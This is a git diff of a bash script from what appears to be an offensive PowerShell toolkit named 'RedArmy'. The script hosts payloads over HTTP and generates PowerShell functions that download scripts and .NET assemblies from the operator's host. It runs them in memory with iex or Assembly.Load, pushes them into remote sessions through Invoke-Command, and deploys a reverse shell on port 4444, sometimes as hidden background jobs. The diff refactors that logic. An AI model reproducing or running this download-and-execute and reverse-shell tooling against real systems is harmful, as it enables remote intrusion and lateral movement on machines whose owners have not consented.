@@ -1,5 +1,7 @@
 #!/usr/bin/env bash
 
+# shellcheck disable=SC2094
+
 ### Helpers begin
 check_deps() {
     for d in "${deps[@]}"; do
@@ -35,71 +37,26 @@ cleanup() {
 }
 
 deploy() {
-    local action
+    local action="$2"
+    local name="$1"
+    local path="$3"
+
+    case "$action" in
+        "get") deploy_get "$name" "$path" ;;
+        "get-bin") deploy_get_bin "$name" "$path" ;;
+        "run") deploy_run "$name" "$path" ;;
+        "run-bin") deploy_run_bin "$name" "$path" ;;
+    esac
+}
+
+deploy_get() {
     local name="$1"
     local path="$2"
-    local sb
-
-    case "$path" in
-        *".dll") action="Import"; name="${name}DLL" ;;
-        "./"*".ps1") action="Invoke" ;;
-        *".ps1"|*".psd1"|*."psm1") action="Get" ;;
-    esac
-
-    # Build scriptblock
-    case "$action" in
-        "Get"|"Invoke") sb="\$(Get-$name)" ;;
-        "Import") sb="(Get-Command $action-$name).definition" ;;
-    esac
 
     cat <<EOF
-function $action-$name {
-$(
-    case "$action" in
-        ("Get")
-            cat <<EOS
-    [System.Text.Encoding]::ASCII.GetString(($iwr $url/$path).content)
-EOS
-            ;;
-        ("Import")
-            cat <<EOS
-    Import-Module -Assembly (
-        [System.Reflection.Assembly]::Load(($iwr $url/$path).content)
-    )
-EOS
-            ;;
-        ("Invoke")
-            cat <<EOS
-    iex (
-        [System.Text.Encoding]::ASCII.GetString(
-            ($iwr $url/$path).content
-        )
-    )
-EOS
-            ;;
-    esac
-)
-}
-$(
-    case "$action" in
-        ("Invoke")
-            cat <<EOS
 function Get-$name {
     [System.Text.Encoding]::ASCII.GetString(($iwr $url/$path).content)
 }
-function $action-${name}InBg {
-    Start-Job -ScriptBlock (
-        [scriptblock]::Create(
-            'Start-Process -ArgumentList "-c", (
-                [scriptblock]::Create(\$(Get-$name))
-            ) -NoNewWindow powershell'
-        )
-    )
-}
-EOS
-            ;;
-    esac
-)
 function Deploy-$name {
     Param
     (
@@ -110,13 +67,60 @@ function Deploy-$name {
     )
 
     Invoke-Command -ScriptBlock (
-        [scriptblock]::Create($sb)
+        [scriptblock]::Create(\$(Get-$name))
     ) -Session \$sess
 }
-$(
-    case "$action" in
-        ("Invoke")
-            cat <<EOS
+EOF
+}
+
+deploy_get_bin() {
+    local name="$1"
+    local path="$2"
+
+    cat <<EOF
+function Import-$name {
+    Import-Module -Assembly (
+        [System.Reflection.Assembly]::Load(($iwr $url/$path).content)
+    )
+}
+function Deploy-$name {
+    Param
+    (
+        [Parameter(Position = 0)]
+        [ValidateNotNullOrEmpty()]
+        [System.Management.Automation.Runspaces.PSSession]
+        \$sess
+    )
+
+    Invoke-Command -ScriptBlock (
+        [scriptblock]::Create((Get-Command Import-$name).definition)
+    ) -Session \$sess
+}
+EOF
+}
+
+deploy_run() {
+    local name="$1"
+    local path="$2"
+
+    deploy_get "$name" "$path"
+    cat <<EOF
+function Invoke-$name {
+    iex (
+        [System.Text.Encoding]::ASCII.GetString(
+            ($iwr $url/$path).content
+        )
+    )
+}
+function Invoke-${name}InBg {
+    Start-Job -ScriptBlock (
+        [scriptblock]::Create(
+            'Start-Process -ArgumentList "-c", (
+                [scriptblock]::Create(\$(Get-$name))
+            ) -NoNewWindow powershell'
+        )
+    )
+}
 function Deploy-${name}InBg {
     Param
     (
@@ -127,17 +131,17 @@ function Deploy-${name}InBg {
     )
 
     Invoke-Command -AsJob -ScriptBlock (
-        [scriptblock]::Create($sb)
+        [scriptblock]::Create(\$(Get-$name))
     ) -Session \$sess
     sleep 1
     Get-Job | select -last 1 | Receive-Job
 }
-EOS
-            ;;
-    esac
-)
-
 EOF
+}
+
+deploy_run_bin() {
+    # TODO implement for exe
+    echo -n
 }
 
 simplehttp() {
@@ -161,16 +165,17 @@ Usage: ${0##*/} [OPTIONS] <ip>
 Spin up a simple HTTP server to host the RedArmy scripts.
 
 Options:
-    -h, --help         Display this help message
-    --invade=FILE      Use the specified invade filename instead of
-                       invade.ps1
-    --no-color         Disable colorized output
-    -p, --port=NUM     Use the specified port (default: 8080)
-    -r, --rport=NUM    Use the specified port for reverse shell
-                       (default: 4444)
-    --rshell=FILE      Use the specified rshell filename instead of
-                       rshell.ps1
-    -u, --update       Update git submodules
+    -c, --config=FILE    Use the specified config
+    -h, --help           Display this help message
+    --invade=FILE        Use the specified invade filename instead of
+                         invade.ps1
+    --no-color           Disable colorized output
+    -p, --port=NUM       Use the specified port (default: 8080)
+    -r, --rport=NUM      Use the specified port for reverse shell
+                         (default: 4444)
+    --rshell=FILE        Use the specified rshell filename instead of
+                         rshell.ps1
+    -u, --update         Update git submodules
 
 EOF
     exit "$1"
@@ -179,6 +184,7 @@ EOF
 declare -a args deps
 unset help update
 color="true"
+config="config.default"
 deps+=("git")
 deps+=("iptables")
 invade_ps1="invade.ps1"
@@ -193,6 +199,7 @@ check_deps
 while [[ $# -gt 0 ]]; do
     case "$1" in
         "--") shift && args+=("$@") && break ;;
+        "-c"|"--config"*) config="$(long_opt "$@")" || shift ;;
         "-h"|"--help") help="true" ;;
         "--invade"*) invade_ps1="$(long_opt "$@")" || shift ;;
         "--no-color") unset color ;;
@@ -213,16 +220,20 @@ done
 # Make sure in serve directory
 cd "$(dirname "$0")" || errx 2 "You're doing something horribly wrong"
 
+# Save IP and URL
 ip="$1"
 url="http://$ip:$port"
 
+# Update submodules
 if [[ -n $update ]]; then
     git submodule update --init --recursive
     git submodule foreach ../../scripts/update_module
 fi
 
-config="config.default"
-[[ ! -f config ]] || config="config"
+# Use "./config" if it exists and a config wasn't specified
+case "$config" in
+    "config.default") [[ ! -f config ]] || config="config" ;;
+esac
 
 # Save some variables for convenience
 cwd="\$ExecutionContext.SessionState.Path.CurrentLocation"
@@ -248,15 +259,16 @@ if (($languagemode -match "constrained")) {
 }
 
 $(
-    while read -r name path; do
-        deploy "$name" "$path"
-    done < <(grep -Psv "^\s*(#.*)?$" "$config"); unset name path
+    while read -r name action path; do
+        deploy "$name" "$action" "$path"
+    done < <(grep -Psv "^\s*(#.*)?$" "$config")
+    unset name action path
 
     # Add reverse shell function
-    deploy ReverseShell "./$rshell_ps1"
+    deploy ReverseShell run "./$rshell_ps1"
 
     # Add invade shell function
-    deploy RedArmy "$invade_ps1"
+    deploy RedArmy get "$invade_ps1"
 )
 
 # Change prompt colors so user knows RedArmy is loaded in current
